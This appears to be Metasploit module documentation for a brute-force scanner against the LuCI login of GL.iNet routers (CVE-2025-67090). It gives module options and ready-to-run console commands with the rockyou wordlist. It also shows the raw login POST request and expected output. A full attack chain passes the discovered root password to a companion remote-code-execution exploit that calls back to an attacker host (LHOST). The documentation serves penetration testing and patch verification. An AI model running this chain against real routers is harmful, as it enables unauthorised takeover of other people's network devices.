# GL.iNet Router LuCI Login Brute-Force

## Description

This module exploits **CVE-2025-67090**, the absence of any rate limiting or
account lockout on the LuCI web interface of GL.iNet routers running
OpenWrt-based firmware **<= 4.6.8**.

Passwords are tested concurrently against `POST /cgi-bin/luci`. A `302`
redirect response indicates a successful login. Discovered credentials are
optionally verified against the RPC challenge/response API and stored in the
Metasploit database for direct use with the companion exploit module
`exploits/linux/http/glinet_rce`.

## Vulnerable Products

Same device and firmware range as CVE-2025-67089. See
`exploits/linux/http/glinet_rce` for a full device list. Patched in firmware
**4.6.8**.

## Module Options

| Option | Required | Default | Description |
|--------|----------|---------|-------------|
| `RHOSTS` | Yes | | Target router IP |
| `RPORT` | Yes | 80 | Target port |
| `USERNAME` | Yes | root | Admin username to test |
| `PASS_FILE` | Yes | | Path to password wordlist |
| `CONCURRENCY` | Yes | 10 | Number of concurrent login threads |
| `VERIFY_RPC` | Yes | true | Verify found credential via RPC API |

## Verification

### Brute-force only

```
msf6 > use auxiliary/scanner/http/glinet_login
msf6 auxiliary(glinet_login) > set RHOSTS 192.168.8.1
msf6 auxiliary(glinet_login) > set USERNAME root
msf6 auxiliary(glinet_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(glinet_login) > set CONCURRENCY 10
msf6 auxiliary(glinet_login) > run
```

Expected output:

```
[*] Loaded 14344392 passwords
[*] Brute-forcing root with concurrency=10
[+] Valid credential: root:<password>
[+] RPC login confirmed (sid: nGIcpQC8...)
[*] Auxiliary module execution completed
```

Confirm the credential was stored:

```
msf6 > creds
```

### Full attack chain with glinet_rce

```
# Step 1 — discover credentials
msf6 > use auxiliary/scanner/http/glinet_login
msf6 auxiliary(glinet_login) > set RHOSTS 192.168.8.1
msf6 auxiliary(glinet_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(glinet_login) > run

# Step 2 — exploit
msf6 > use exploits/linux/http/glinet_rce
msf6 exploit(glinet_rce) > set RHOSTS 192.168.8.1
msf6 exploit(glinet_rce) > set USERNAME root
msf6 exploit(glinet_rce) > set PASSWORD <discovered>
msf6 exploit(glinet_rce) > set LHOST <attacker-ip>
msf6 exploit(glinet_rce) > run
```

## How It Works

### Brute-force (CVE-2025-67090)

Each password candidate is submitted as a standard LuCI form POST:

```
POST /cgi-bin/luci HTTP/1.1
Content-Type: application/x-www-form-urlencoded

luci_username=root&luci_password=<candidate>
```

A `302` redirect response means the login succeeded. The module spawns
`CONCURRENCY` worker threads that draw from a shared queue and stop as soon
as any thread finds a valid password.

### RPC Verification (VERIFY_RPC)

When `VERIFY_RPC` is true (default), the module additionally authenticates via
the RPC challenge/response protocol — the same flow used by `glinet_rce` — to
confirm the credential will work with the exploit module. See
`exploits/linux/http/glinet_rce` for a full description of the RPC auth flow.

## Tips

- On Kali, rockyou.txt ships compressed: `gunzip /usr/share/wordlists/rockyou.txt.gz`
- Increase `CONCURRENCY` on a fast LAN — the router imposes no rate limit so
  higher concurrency directly reduces runtime
- Set `VERIFY_RPC false` to skip RPC verification if you only need the LuCI
  credential or want faster results

## References

- CVE-2025-67090 — Improper Restriction of Authentication Attempts (CWE-307)
- CVE-2025-67089 — OS Command Injection (CWE-78)
- https://www.gl-inet.com/security/